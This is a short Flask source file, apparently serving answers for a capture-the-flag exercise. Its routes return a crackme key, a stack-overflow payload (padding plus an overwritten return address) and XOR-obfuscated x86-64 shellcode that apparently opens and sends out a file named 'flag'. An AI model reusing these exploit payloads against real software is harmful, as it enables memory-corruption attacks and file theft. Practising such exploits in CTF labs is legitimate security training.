import json
import logging

from flask import request

from routes import app

logger = logging.getLogger(__name__)


@app.route('/payload_crackme', methods=['GET'])
def solve_crackme():
    # data = request.get_json()
    # logging.info("data sent for evaluation {}".format(data))
    # input_value = data.get("input")
    # result = input_value * input_value
    # logging.info("My result :{}".format(result))
    # return json.dumps(result)
    return "000-0000000"


@app.route('/payload_stack', methods=['GET'])
def solve_stack():
    return b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xfa\x11@\x00\x00\x00\x00\x00'


@app.route('/payload_shellcode', methods=['GET'])
def solve_shellcode():
    # return b'hflagj\x02XH\x89\xe71\xf6\x0f\x05A\xba\xff\xff\xff\x7fH\x89\xc6j(Xj\x01_\x99\x0f\x05'
    return b'H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.gm`f\x01\x01\x01H1\x04$j\x02XH\x89\xe71\xf6\x0f\x05A\xba\xff\xff\xff\x7fH\x89\xc6j(Xj\x01_\x99\x0f\x05'


